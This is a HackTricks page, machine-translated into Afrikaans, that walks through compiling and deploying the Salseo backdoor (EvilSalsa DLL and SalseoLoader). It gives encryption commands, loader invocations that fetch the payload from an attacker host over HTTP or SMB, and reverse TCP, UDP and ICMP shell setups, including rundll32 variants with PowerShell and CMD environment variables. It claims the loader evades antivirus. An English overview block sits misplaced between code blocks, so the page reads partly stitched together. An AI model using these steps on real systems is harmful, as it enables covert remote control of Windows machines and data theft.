# Salseo

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Kompilering van die binnerwerke

Laai die bronkode van die github af en kompileer **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode te kompileer.

Kompileer hierdie projekte vir die argitektuur van die Windows-boks waar jy dit gaan gebruik (As die Windows x64 ondersteun, kompileer dit vir daardie argitekture).

Jy kan die argitektuur **kies** binne Visual Studio in die **linker "Build" Tab** in **"Platform Target".**

(\*\*As jy hierdie opsies nie kan vind nie, druk op **"Project Tab"** en dan op **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Bou dan beide projekte (Build -> Build Solution) (Binne die logs sal die pad van die uitvoerbare lêer verskyn):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Berei die agterdeur voor

Eerstens sal jy die **EvilSalsa.dll** moet enkodeer. Jy kan die Python-skripsie **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** kompileer:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

Salseo is a backdoor that allows remote access to a compromised Windows system. It is commonly used by attackers to maintain persistence and control over the compromised system.

##### Features

- **Remote Access**: Salseo provides remote access to the compromised system, allowing the attacker to execute commands and interact with the system.
- **Persistence**: Salseo is designed to maintain persistence on the compromised system, ensuring that the attacker can regain access even after system reboots.
- **Stealth**: Salseo is designed to operate stealthily, avoiding detection by antivirus software and other security measures.
- **Command Execution**: Salseo allows the attacker to execute arbitrary commands on the compromised system, giving them full control over the system.
- **File Transfer**: Salseo supports file transfer between the attacker's system and the compromised system, allowing the attacker to exfiltrate data or upload additional tools.
- **Keylogging**: Salseo can be configured to log keystrokes on the compromised system, allowing the attacker to capture sensitive information such as passwords.
- **Screenshot Capture**: Salseo can capture screenshots of the compromised system, providing the attacker with visual information about the system's activities.
- **Network Communication**: Salseo communicates with the attacker's system over the network, enabling remote control and data exfiltration.

##### Detection and Mitigation

- **Antivirus Software**: Keep your antivirus software up to date to detect and remove known instances of Salseo.
- **Network Monitoring**: Monitor network traffic for suspicious activity, such as connections to known malicious IP addresses or unusual data transfers.
- **System Hardening**: Implement security best practices, such as disabling unnecessary services, applying patches and updates, and using strong passwords.
- **Behavioral Analysis**: Use behavioral analysis tools to detect abnormal system behavior that may indicate the presence of Salseo.
- **Firewall**: Configure a firewall to block incoming and outgoing connections to known malicious IP addresses or suspicious domains.
- **User Education**: Educate users about the risks of opening suspicious email attachments or clicking on malicious links, as these are common infection vectors for Salseo.

##### Conclusion

Salseo is a powerful backdoor that provides attackers with remote access and control over compromised Windows systems. Detecting and mitigating Salseo requires a combination of proactive security measures, such as antivirus software, network monitoring, system hardening, behavioral analysis, firewall configuration, and user education. By implementing these measures, you can significantly reduce the risk of Salseo infection and protect your systems from unauthorized access.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, nou het jy alles wat jy nodig het om die hele Salseo ding uit te voer: die **gekodeerde EvilDalsa.dll** en die **binêre van SalseoLoader.**

**Laai die SalseoLoader.exe binêre na die masjien op. Dit behoort nie deur enige AV opgespoor te word nie...**

## **Voer die agterdeur uit**

### **Kry 'n TCP-omgekeerde skulp (deur die gekodeerde dll af te laai deur HTTP)**

Onthou om 'n nc as die omgekeerde skulp luisteraar te begin en 'n HTTP-bediener om die gekodeerde evilsalsa te bedien.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Kry 'n UDP omgekeerde dop (laai gekodeerde dll af deur SMB)**

Onthou om 'n nc as die omgekeerde dop luisteraar te begin, en 'n SMB-bediener om die gekodeerde evilsalsa te dien (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kry 'n ICMP omgekeerde dop (geënkripteerde dll reeds binne die slagoffer)**

**Hierdie keer het jy 'n spesiale instrument in die kliënt nodig om die omgekeerde dop te ontvang. Laai af:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Deaktiveer ICMP Antwoorde:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Voer die kliënt uit:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Binne die slagoffer, laat ons die salseo ding uitvoer:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilering van SalseoLoader as DLL wat die hooffunksie uitvoer

Maak die SalseoLoader-projek oop met behulp van Visual Studio.

### Voeg voor die hooffunksie by: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installeer DllExport vir hierdie projek

#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Soek na die DllExport-pakket (deur die Browse-tabblad te gebruik) en druk op Installeer (en aanvaar die popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

In jou projeklêer het die lêers verskyn: **DllExport.bat** en **DllExport\_Configure.bat**

### **D**eïnstalleer DllExport

Druk **Deïnstalleer** (ja, dit is vreemd, maar glo my, dit is nodig)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Sluit Visual Studio af en voer DllExport\_configure uit**

Sluit eenvoudig Visual Studio af

Gaan dan na jou **SalseoLoader-lêer** en **voer DllExport\_Configure.bat uit**

Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace for DllExport**) en druk op **Apply**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Maak die projek weer oop met Visual Studio**

**\[DllExport]** behoort nie meer as 'n fout gemerk te wees nie

![](<../.gitbook/assets/image (8) (1).png>)

### Bou die oplossing

Kies **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)

![](<../.gitbook/assets/image (10) (1).png>)

Kies **x64-platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Om die oplossing te **bou**: Build --> Build Solution (Die pad van die nuwe DLL sal in die Uitvoerkonsole verskyn)

### Toets die gegenereerde Dll

Kopieer en plak die Dll waar jy dit wil toets.

Voer uit:
```
rundll32.exe SalseoLoader.dll,main
```
As geen fout verskyn nie, het jy waarskynlik 'n funksionele DLL!!

## Kry 'n skul gebruik die DLL

Moenie vergeet om 'n **HTTP** **bediener** te gebruik en 'n **nc** **luisteraar** in te stel

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is 'n opdraggewer wat beskikbaar is op Windows-bedryfstelsels. Dit bied 'n gebruikersvriendelike omgewing waarin gebruikers opdragte kan uitvoer om verskeie take uit te voer. Hierdie opdragte kan gebruik word om sagteware te installeer, lêers te skep en te wysig, netwerkverbindings te bestuur en vele ander funksies uit te voer. CMD is 'n kragtige hulpmiddel wat deur hackers gebruik kan word om toegang tot 'n stelsel te verkry en verskeie aanvalle uit te voer.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
